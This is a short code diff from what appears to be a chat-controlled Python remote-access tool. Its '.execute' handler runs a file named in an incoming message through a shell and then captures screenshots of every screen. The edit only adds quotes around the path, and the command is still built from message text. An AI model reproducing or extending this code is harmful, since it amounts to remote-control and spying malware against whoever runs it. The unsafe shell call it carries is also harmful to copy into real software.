@@ -52,7 +52,8 @@ elif message.content[:8] == '.execute':
                 #.log Requested file-to-execute does exist on this PC 
                 try:
                     #.log Trying to execute the file 
-                    subprocess.run('start ' + '/'.join(working_directory) + '/' + message.content[9:], shell=True)
+                    file_extension = os.path.splitext(message.content[9:])[1]
+                    subprocess.run('start "" "' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
                     #.log Executed the files 
                     await asyncio.sleep(1)
                     ImageGrab.grab(all_screens=True).save('ss.png')
